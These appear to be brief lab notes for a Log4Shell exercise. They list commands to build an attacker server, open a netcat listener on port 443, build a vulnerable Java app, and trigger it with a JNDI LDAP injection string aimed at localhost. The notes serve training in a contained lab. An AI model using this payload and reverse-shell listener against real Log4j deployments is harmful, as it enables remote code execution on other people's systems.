# 3204

Set up server
cd log4jshell-lab/attacker
docker-compose build 
docker-compse up -d 

net cat listener 
nc -lvnp 443


start the java app
cd log4jshell-lab/victim/vuln-apps/others/basicJar

docker run -it --rm -v "$(pwd)":/opt/maven -w /opt/maven maven mvn clean install



run exploit 
java -cp target/Log4jLabProject-1.0-SNAPSHOT-all.jar com.log4jshell.App '${jndi:ldap://127.0.0.1:1389/Run}'
